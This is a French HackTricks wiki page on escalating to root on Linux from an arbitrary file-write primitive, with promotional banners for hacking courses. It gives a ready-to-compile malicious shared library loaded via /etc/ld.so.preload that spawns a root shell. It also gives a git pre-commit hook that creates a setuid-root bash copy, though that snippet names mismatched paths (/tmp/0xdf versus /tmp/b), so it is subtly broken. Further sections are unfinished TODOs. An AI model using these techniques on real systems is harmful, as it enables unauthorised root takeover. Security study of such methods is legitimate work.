# Écriture de fichier arbitraire vers Root

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}

### /etc/ld.so.preload

Ce fichier se comporte comme la variable d'environnement **`LD_PRELOAD`** mais fonctionne également dans les **binaires SUID**.\
Si vous pouvez le créer ou le modifier, vous pouvez simplement ajouter un **chemin vers une bibliothèque qui sera chargée** avec chaque binaire exécuté.

Par exemple : `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Crochets Git

[**Les crochets Git**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sont des **scripts** qui sont **exécutés** lors de divers **événements** dans un dépôt git comme lorsqu'un commit est créé, une fusion... Ainsi, si un **script ou utilisateur privilégié** effectue fréquemment ces actions et qu'il est possible d'**écrire dans le dossier `.git`**, cela peut être utilisé pour **l'élévation de privilèges**.

Par exemple, il est possible de **générer un script** dans un dépôt git dans le répertoire **`.git/hooks`** afin qu'il soit toujours exécuté lorsqu'un nouveau commit est créé:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
{% endcode %}

### Fichiers Cron & Time

TODO

### Fichiers de Service & Socket

TODO

### binfmt\_misc

Le fichier situé dans `/proc/sys/fs/binfmt_misc` indique quel binaire doit exécuter quel type de fichiers. TODO: vérifier les exigences pour exploiter cela afin d'exécuter un shell inversé lorsqu'un type de fichier courant est ouvert.

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}
